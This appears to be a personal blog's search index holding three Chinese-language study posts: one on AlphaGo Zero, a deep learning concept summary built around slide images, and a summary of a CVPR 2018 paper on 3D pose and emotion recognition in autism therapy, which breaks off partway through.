<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[NATURE 2017 | Mastering the game of Go without human knowledge]]></title>
      <url>http://yikunhaocong.com/2018/07/13/AlpbaZero/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    <strong>基于蒙特卡洛树搜索和深度卷积神经网络的自我对弈学习系统的构建 | 本博文为个人理解&amp;整理思路所写，仅供参考</strong><br>    <a href="http://openaccess.thecvf.com/content_cvpr_2018/papers/Zanfir_Monocular_3D_Pose_CVPR_2018_paper.pdf" target="_blank" rel="external">Mastering the game of Go without human knowledge (Nature 2017)</a><br><a id="more"></a><p></p>
<blockquote>
<blockquote>
<p><a href="https://www.zhihu.com/question/39916945" target="_blank" rel="external">(知乎)蒙特卡洛树是什么算法？</a><br><a href="https://zhuanlan.zhihu.com/p/32089487" target="_blank" rel="external">(知乎)AlphaZero实战：从零学下五子棋</a><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_02.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_03.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_04.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_05.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_06.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_07.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_08.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_09.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_10.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_11.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_12.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_13.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_14.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_15.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_16.jpg" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/AlphaGo%20Zero_%E9%A1%B5%E9%9D%A2_17.jpg" alt=""></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
<blockquote>
<p><strong> When you have to make a choice and don’t make it, that is in itself a choice.<br>——William James<br>Do not miss any chance</strong></p>
</blockquote>
</blockquote>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Nature </category>
            
            <category> 论文研读总结 </category>
            
            <category> 自我对弈 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Reinforcement learning </tag>
            
            <tag> Supervised learning </tag>
            
            <tag> Upper Confidence Bound </tag>
            
            <tag> Monte Carlo Tree Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[来自灵魂画手的Deep Learning可视化汇总&解析]]></title>
      <url>http://yikunhaocong.com/2018/06/12/DL-review-1/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    <strong>把我珍藏的28张图送给大家，分享最生动&amp;重要的DL知识点 | 本博文为个人理解&amp;整理思路所写，仅供参考</strong><br>    <a href="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB.pdf" target="_blank" rel="external">深度学习知识点汇总.pdf / 19.13M</a><br><a id="more"></a><p></p>
<blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-01.jpg" alt=""></p>
</blockquote>
<h2 id="a-A-Neural-Net-Logistic-Regression"><a href="#a-A-Neural-Net-Logistic-Regression" class="headerlink" title="a.A Neural Net(Logistic Regression)"></a>a.A Neural Net(Logistic Regression)</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-02.jpg" alt=""></p>
<blockquote>
<p><strong>1.建议逻辑回归自己手写推导一遍，这样才能加强理解,若还未理解可以见这里：<a href="https://zhuanlan.zhihu.com/p/28408516" target="_blank" rel="external">逻辑回归（Logistic Regression）（一）</a>和<a href="https://zhuanlan.zhihu.com/p/28415991" target="_blank" rel="external">逻辑回归（Logistic Regression）（二）</a></strong></p>
<p><strong>2.要理解最大似然是如何变形到最小化Loss函数再总体构建Cost函数的</strong></p>
<p><strong>3.对于求偏导中间的化简要牢记，对于符号的改变也要知其所以然</strong></p>
</blockquote>
</blockquote>
<h2 id="b-Shallow-Deep-Neural-Nets"><a href="#b-Shallow-Deep-Neural-Nets" class="headerlink" title="b.Shallow/Deep Neural Nets"></a>b.Shallow/Deep Neural Nets</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-03.jpg" alt=""></p>
<blockquote>
<p><strong>1.要理解激活函数的实际意义，例如将线性关系转换为非线性</strong></p>
<p><strong>2.要充分掌握各类激活函数的特性，例如Leaky ReLU(带泄露线性整流单元是用于避免梯度消失)</strong></p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-04.jpg" alt=""></p>
<blockquote>
<p><strong>对于深度神经网络，要注意学习率、激活函数选择、梯度动量的加入、批次规模和正则化这几点</strong></p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-05.jpg" alt=""></p>
<blockquote>
<p><strong>1. 偏差和方差的概念要理解清楚，一般而言只有在偏差已经通过训练达到稳定时才考虑方差(即如果模型还处于欠拟合的状态，那么方差大有可能是因为偏差大的原因，也有可能是因为模型本身有问题或选取训练集数据的原始分布和测试集数据的分布有较大差异)</strong></p>
<p><strong>2. 当偏差过大时，可以考虑用更大的神经网络进行训练或训练更久或采用不同的网络结构(模型)</strong></p>
<p><strong>3. 当偏差稳定方差过大时，可以考虑用更多的数据进行训练或进行正则化防止过拟合或采用不同的网络结构(模型)</strong></p>
</blockquote>
</blockquote>
<h2 id="c-Regularization"><a href="#c-Regularization" class="headerlink" title="c.Regularization"></a>c.Regularization</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-06.jpg" alt=""></p>
<blockquote>
<p><strong>L1和L2正则化都惩罚了过大的权重，可能会导致某些权重趋于0，但总体会使得网络朝着更简单的方向训练</strong></p>
</blockquote>
</blockquote>
<h2 id="d-Optimization-Algorithms"><a href="#d-Optimization-Algorithms" class="headerlink" title="d.Optimization Algorithms"></a>d.Optimization Algorithms</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-07.jpg" alt=""></p>
<blockquote>
<p><strong>1.<a href="https://www.zhihu.com/question/20455227" target="_blank" rel="external">特征工程中的「归一化」有什么作用？</a></strong></p>
<p><strong>2.要理解“锯齿状”很可能是因为数据无归一化 =&gt; 使得不同维度(特征)的尺度差别大 =&gt; 梯度下降时由于学习率一致，所以尺度较大的那个维度(特征)下降的幅度更大 =&gt; 因此导致下降曲线在某个维度的方向更长 =&gt; 若归一化后可以使用更大的学习率，因为每个维度都保持较小的尺度而下降更稳健更高效</strong></p>
<p><strong>3.何时使用归一化，何时用标准化？</strong></p>
<blockquote>
<p>1.如果对输出结果范围有要求，用归一化</p>
<p>2.如果数据较为稳定，不存在极端的最大最小值，用归一化</p>
<p>3.如果数据存在较多噪音和异常值，用标准化，可以间接通过中心化避免异常值和极端值的影响</p>
</blockquote>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-08.jpg" alt=""></p>
<blockquote>
<p><strong>要理解各类梯度下降优化方法的原理及作用，Momentum、RMSProp、Adam以及Learning rate decay</strong></p>
</blockquote>
</blockquote>
<h2 id="e-Hyperparameters-Tuning"><a href="#e-Hyperparameters-Tuning" class="headerlink" title="e.Hyperparameters Tuning"></a>e.Hyperparameters Tuning</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-09.jpg" alt=""></p>
<blockquote>
<p><strong>超参调节的重要程度排序：</strong></p>
<blockquote>
<p>1.学习率<br>2.隐藏层的神经元数<br>3.训练批次的规模数量<br>4.动量系数<br>5.网络层数<br>6.学习率衰减系数</p>
</blockquote>
</blockquote>
</blockquote>
<h2 id="f-F1-ROC-AUC-Error-Analysis"><a href="#f-F1-ROC-AUC-Error-Analysis" class="headerlink" title="f.F1/ROC/AUC/Error Analysis"></a>f.F1/ROC/AUC/Error Analysis</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-10.jpg" alt=""></p>
<blockquote>
<p>复习一下：</p>
<p><strong>1.<a href="https://blog.csdn.net/baimafujinji/article/details/6495877" target="_blank" rel="external">机器学习中的Accuracy，Precision，Recall和F1-Score</a></strong></p>
<p><strong>2.<a href="https://www.zhihu.com/question/34941131" target="_blank" rel="external">统计学中Precision，Recall和F1的来源是什么？</a></strong></p>
<p><strong>3.<a href="http://alexkong.net/2013/06/introduction-to-auc-and-roc/" target="_blank" rel="external">ROC和AUC介绍以及如何计算AUC</a></strong></p>
<p><strong>4.注意F1=0.5<em>(1/p+1/r)=(p+r)/(2</em>p*r),F1是precision和Recall的调和平均数</strong></p>
<p><strong>5.与ROC相关的两个量，fp rate = FP / N 和 tp rate = TP /P，注意与precision区分</strong></p>
<p><strong>6.画ROC曲线 =&gt; 首先将样本按正概率排序，再依次作为阈值画点(fp_rate,tp_rate) =&gt; AUC即ROC曲线下的面积</strong></p>
<p><strong>7.AUC越大，说明当前分类算法越有可能将正样本排在负样本前面，即能够有更好的分类</strong></p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-11.jpg" alt=""></p>
<blockquote>
<p><strong>DL对随机错误具有鲁棒性，但是对系统错误则不具备 =&gt; 即DL可以容忍数据集里的部分噪音，但是如果数据集里标签和实际种类不对应(出现系统性整体性错误)，那么DL将失去准确性</strong></p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-12.jpg" alt=""></p>
</blockquote>
<h2 id="g-Transfer-Multitask-End-To-End-Learning"><a href="#g-Transfer-Multitask-End-To-End-Learning" class="headerlink" title="g.Transfer/Multitask/End-To-End Learning"></a>g.Transfer/Multitask/End-To-End Learning</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-13.jpg" alt=""></p>
<blockquote>
<p>端到端学习的优点：</p>
<p><strong>1.能够让数据“说话”，也就是说可能会找到我们人类没有意识到的存在于数据里的一些显性/隐性特征</strong></p>
<p><strong>2.不需要过多的手工特征组件设计，即机器学习中庞大的特征工程</strong></p>
<p>缺点：</p>
<p><strong>1.需要大量的学习数据</strong></p>
<p><strong>2.排除了潜在的有用的手工特征工程</strong></p>
</blockquote>
</blockquote>
<h2 id="h-CNN-Padding-Stride-Filters"><a href="#h-CNN-Padding-Stride-Filters" class="headerlink" title="h.CNN(Padding/Stride/Filters)"></a>h.CNN(Padding/Stride/Filters)</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-14.jpg" alt=""></p>
<blockquote>
<p><strong>卷积神经网络：解决了全连接网络参数过多的问题，同时也解决了物体不总在图片某一位置的问题，具有局部感受野</strong></p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-15.jpg" alt=""></p>
<blockquote>
<p>复习一下：<br><strong><a href="https://www.jianshu.com/p/05c4f1621c7e" target="_blank" rel="external">Tensorflow中卷积的padding操作</a></strong></p>
<p><strong>Padding（max）的好处：</strong></p>
<blockquote>
<p>1.降低了图像表示的数据量</p>
<p>2.加快了卷积计算</p>
<p>3.让某些被检测到的特征更具有鲁棒性</p>
</blockquote>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-16.jpg" alt=""></p>
</blockquote>
<h2 id="i-LeNet-5-AlexNet-VGG-16"><a href="#i-LeNet-5-AlexNet-VGG-16" class="headerlink" title="i.LeNet-5/AlexNet/VGG-16"></a>i.LeNet-5/AlexNet/VGG-16</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-17.jpg" alt=""></p>
<blockquote>
<p>复习一下：<br><strong>1.<a href="http://noahsnail.com/2017/03/02/2017-3-2-LeNet%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/" target="_blank" rel="external">LeNet神经网络</a></strong></p>
<p><strong>2.<a href="https://zhuanlan.zhihu.com/p/21562756" target="_blank" rel="external">【卷积神经网络-进化史】从LeNet到AlexNet</a></strong></p>
<p><strong>3.LeNet:使用平均池化代替最大池化，使用sigmod/tanh而不是ReLU</strong></p>
<p><strong>4.AlexNet:比LeNet更大，使用ReLU和Dropout</strong></p>
</blockquote>
</blockquote>
<h2 id="j-Residual-Inception-Network"><a href="#j-Residual-Inception-Network" class="headerlink" title="j.Residual/Inception Network"></a>j.Residual/Inception Network</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-18.jpg" alt=""></p>
<blockquote>
<p>加强一下：</p>
<p><strong>1.Residual nets残差网络，主要用于解决梯度爆炸和梯度消失问题</strong></p>
<p><strong>2.<a href="https://blog.csdn.net/a1154761720/article/details/53411365" target="_blank" rel="external">1*1的卷积核与Inception</a></strong></p>
<p><strong>3.<a href="https://blog.csdn.net/haolexiao/article/details/77073258" target="_blank" rel="external">【机器学习】关于CNN中1×1卷积核和Network in Network的理解</a></strong></p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-19.jpg" alt=""></p>
</blockquote>
<h2 id="k-Detection-Recognition"><a href="#k-Detection-Recognition" class="headerlink" title="k.Detection/Recognition"></a>k.Detection/Recognition</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-20.jpg" alt=""></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-21.jpg" alt=""></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-22.jpg" alt=""></p>
</blockquote>
<h2 id="l-RNN-LSTM-BRNN"><a href="#l-RNN-LSTM-BRNN" class="headerlink" title="l.RNN(LSTM/BRNN)"></a>l.RNN(LSTM/BRNN)</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-23.jpg" alt=""></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-24.jpg" alt=""></p>
</blockquote>
<h2 id="m-NLP-Word-Embeddings"><a href="#m-NLP-Word-Embeddings" class="headerlink" title="m.NLP(Word Embeddings)"></a>m.NLP(Word Embeddings)</h2><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-25.jpg" alt=""></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-26.jpg" alt=""></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-27.jpg" alt=""></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB-28.jpg" alt=""></p>
<blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
<blockquote>
<p><strong>“A creative man is motivated by the desire to achieve, not by the desire to beat others.” – Ayn Rand</strong></p>
</blockquote>
</blockquote>
</blockquote>
]]></content>
      
        <categories>
            
            <category> DL知识点汇总(全) </category>
            
        </categories>
        
        
        <tags>
            
            <tag> a.A Neural Net(Logistic Regression) </tag>
            
            <tag> b.Shallow/Deep Neural Nets </tag>
            
            <tag> c.Regularization </tag>
            
            <tag> d.Optimization Algorithms </tag>
            
            <tag> e.Hyperparameters Tuning </tag>
            
            <tag> f.F1/ROC/AUC/Error Analysis </tag>
            
            <tag> g.Transfer/Multitask/End-To-End Learning </tag>
            
            <tag> h.CNN(Padding/Stride/Filters) </tag>
            
            <tag> i.LeNet-5/AlexNet/VGG-16 </tag>
            
            <tag> j.Residual/Inception Network </tag>
            
            <tag> k.Detection/Recognition </tag>
            
            <tag> l.RNN(LSTM/BRNN) </tag>
            
            <tag> m.NLP(Word Embeddings) </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVPR 2018 | 3D Human Sensing, Action and Emotion Recognition in Robot Assisted Therapy of Children with Autism]]></title>
      <url>http://yikunhaocong.com/2018/06/12/CVPR-2018-3D-Human-Sensing-Action-and-Emotion-Recognition/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    <strong>细粒度动作识别和情绪预测任务 | 本博文为个人理解&amp;整理思路所写，仅供参考</strong><br>    <a href="http://202.38.196.91/cache/9/03/openaccess.thecvf.com/2d21db575aca55d1d7704080a3bdd4ae/Marinoiu_3D_Human_Sensing_CVPR_2018_paper.pdf" target="_blank" rel="external">3D Human Sensing, Action and Emotion Recognition in Robot Assisted Therapy of Children with Autism (CVPR 2018)</a><br><a id="more"></a><p></p>
<blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB4.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/CVB15.png" alt=""></p>
<h2 id="本论文目标："><a href="#本论文目标：" class="headerlink" title="本论文目标："></a>本论文目标：</h2><p>We analyze a large scale video dataset containing<br>child-therapist interactions and subtle behavioral annotations.The dataset is challenging for its long videos,large number of action and emotion (valence-arousal)annotations, difficult viewpoints, partial views, and occlusions between child and therapist.</p>
<blockquote>
<p><strong>1. 分析包含儿童-治疗师的大规模视频数据集，进行细微表情的注释，这些数据集包含大量动作和情绪(valence-arousal(可以理解为表示情绪类型和对应程度的一个坐标系))注释，和具有挑战性的场景——只看到部分视野以及会存在儿童与治疗师之间的occlusions(遮挡)。</strong></p>
</blockquote>
<p>We adapt state-of-the-art 3d human pose estimation models to this setting, making it possible to reliably<br>track and reconstruct both the child and the therapist,<br>from RGB data, at comparable performance levels with an industrial-grade Kinect system. This is desirable<br>as our proposed models offer not just 3d human pose reconstructions, but additionally detailed human body part segmentation information which can be effective, in the long run, in precisely capturing complex interactions or subtle behavior.</p>
<blockquote>
<p><strong>2. 我们将先进的三维人体姿态估计模型应用于该设置，使得可以使用工业级Kinect系统以可比较的性能水平从RGB数据中可靠地跟踪和重建儿童和治疗师。这是可取的，因为我们提出的模型不仅提供了三维人体姿态重建，还提供了详细的人体部位分割信息，从长远来看，它可以有效地捕捉复杂的相互作用或微妙的行为。</strong></p>
</blockquote>
<p>We establish several action and emotion recognition<br>baselines, including systems based on child representations, and models that jointly capture the<br>child and the therapist. The data, annotations and<br>recognition models are made available online at<br><a href="http://vision.imar.ro/de-enigma" target="_blank" rel="external">http://vision.imar.ro/de-enigma</a>.</p>
<blockquote>
<p><strong>3. 我们建立了几个动作和情绪识别基线，包括基于儿童表示的系统<br>和共同捕捉儿童和治疗师的模型。数据，注释和识别模型在上述的网站中可以获取。</strong></p>
</blockquote>
</blockquote>
<h2 id="本论文的成果："><a href="#本论文的成果：" class="headerlink" title="本论文的成果："></a>本论文的成果：</h2><blockquote>
<p>切入点：论文结合已有的一些辅助治疗手段，并处理已经诊断出的较大儿童的一些数据，在较少受限的环境中进行机器人辅助治疗，专注于理解针对儿童需求个性化技术发展的身体姿势。</p>
</blockquote>
<h2 id="模型基本过程"><a href="#模型基本过程" class="headerlink" title="模型基本过程"></a>模型基本过程</h2><h3 id="DE-ENIGMA-Action-Annotation-Setup"><a href="#DE-ENIGMA-Action-Annotation-Setup" class="headerlink" title="DE-ENIGMA Action Annotation Setup"></a>DE-ENIGMA Action Annotation Setup</h3><blockquote>
<blockquote>
<p><strong>The DE-ENIGMA dataset contains multi-modal recordings of therapy sessions of children with autism</strong></p>
<p>In this paper, we consider only the RGB + depth modalities recorded using a Kinect v2 camera (at 30 FPS) placed right above the robot head, towards the child (see fig. 1).</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB1.png" alt=""></p>
<blockquote>
<p>首先是实验的启动，按照figure 1从左到右的一个说明，注意此处只有<strong>partial views of therapist and child</strong>，这也是与其它研究不太一样的点，本文接下来会提出一个提升识别部分人体适应性的方法。接下来的一个挑战是治疗师和儿童的交互可能会影响识别效果，后面也提出了针对这个挑战的解决方法。</p>
<p>实验的一个记录和标注的过程：</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB2.png" alt=""></p>
<blockquote>
<p>标注情况总览：</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB3.png" alt=""></p>
<blockquote>
<p><strong>在所有标注的序列里，大概1/3(749/2031)是动作交互的序列</strong> </p>
<p>标注的一些实例：</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB4.png" alt=""></p>
<blockquote>
<p><strong>标注的类别存在较大的不平衡性，如下</strong>：</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB5.png" alt=""></p>
<blockquote>
<p>对于同一类的标签，序列中存在较显著的不同：</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB6.png" alt=""></p>
</blockquote>
<h3 id="Skeleton-Reconstruction-from-RGB-data"><a href="#Skeleton-Reconstruction-from-RGB-data" class="headerlink" title="Skeleton Reconstruction from RGB data"></a>Skeleton Reconstruction from RGB data</h3><blockquote>
<blockquote>
<p>目标：<strong>在有挑战性的治疗师情景设置里自动翻译和对一个儿童的行为做出反应</strong>。</p>
</blockquote>
<p><strong>DMHS</strong>(a multitask deep neural network that estimates both the 2d and 3d joint positions and the semantic human body part labeling of the person)这个在上一篇博文里有介绍了，此处不再赘述。</p>
<blockquote>
<p>本论文改进了<strong>DMHS</strong>，并提出<strong>DMHS Adaptation to Partially Visible People</strong>，即<strong>DMHSPV</strong>， 具体做法是先收集在自然场景里频繁可见的人类keypoint(特征点配置)，使用了COCO训练集(被标注了2d关节点)，只选择了50个最频繁的keypoint，创建了(H80KPartial)数据集，这是对<strong>Human80k</strong>的数据增强。</p>
</blockquote>
<p>对DMHS和DMHSPV在原数据集和增强数据集上进行对比：</p>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB7.png" alt=""></p>
<blockquote>
<p>For Human80K, the accuracy of both DMHS and DMHSPV methods is similar (with slightly better results for DMHSPV). However, the tests on H80KPartial reveal considerably improved accuracy of our fined-tuned variant of DMHS over the original (from 59.6% to 78.0%). This shows success in extending the network’s capabilities for partially visible humans, while preserving its accuracy for fully visible ones.<br><strong>可以看到DMHSPV在保留DMHS原有的识别准确性的基础上，对Partial(只出现部分人体)场景的和别误差降低，鲁棒性更强</strong></p>
<p>对比两个网络进行可视化姿势重建，可以看到后者的效果更好：</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB8.png" alt=""></p>
<blockquote>
<p><strong>Parametric Human Model Inference</strong> 这个模型在上一篇博文里已有说明(这篇论文是和上一篇论文一起写的，基于上一篇的feedforward-feedback模型)，此处不再赘述。</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB9.png" alt=""> </p>
</blockquote>
<h3 id="Skeleton-based-Action-Classification"><a href="#Skeleton-based-Action-Classification" class="headerlink" title="Skeleton-based Action Classification"></a>Skeleton-based Action Classification</h3><blockquote>
<blockquote>
<p><strong>2d姿势特征</strong> + <strong>3d姿势特征</strong> + <strong>交互建模</strong> + <strong>移动姿势</strong></p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB10.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/CVB11.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/CVB12.png" alt=""></p>
<blockquote>
<p>通过CNN进行特征提取，网络结构为：</p>
<p><strong>Conv(3x3)-ReLU-Conv(3x3)-ReLU-Pool(2x2)-Conv(3x3)-ReLUConv(3x3)-Pool(2x2)-Dropout-FC-FC</strong>，输入是被规则化为一个固定时间长度的3d骨架信息。这里加入了增强了数据以避免过拟合，对每一个训练序列以Y为坐标轴随机旋转15°。</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB13.png" alt=""></p>
<blockquote>
<p>输入通过Kinect获取的3d骨架特征特征和通过DMHS-SMPL-T(移动姿势模型)获取的特征到CNN模型中</p>
<p>通过RNN进行预测：</p>
<p>建立了分层双向循环网络基线HBRNN，之前已显示在标准骨架动作分类数据集中表现良好。该模型由5个双向循环网络组成，每个网络接收5个骨架子组件的关节：躯干，左臂，右臂，左腿和右腿</p>
<p>因为治疗师和孩子的腿被遮挡，所以我们不使用腿部数据，只使用对应于躯干，左臂和右臂的关节子集。我们还分别将治疗师左右臂的关节分别作为第四和第五部分。我们使用Kinect 3d姿态估计和由DMHS-SMPL-T推断的那些来测试网络。 Kinect的行为分类准确率为37.8％，DMHS-SMPL-T的行为分类准确率为36.2％。</p>
</blockquote>
</blockquote>
<h2 id="实验结果："><a href="#实验结果：" class="headerlink" title="实验结果："></a>实验结果：</h2><h3 id="Continuous-Emotion-Prediction"><a href="#Continuous-Emotion-Prediction" class="headerlink" title="Continuous Emotion Prediction"></a>Continuous Emotion Prediction</h3><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB14.png" alt=""></p>
<blockquote>
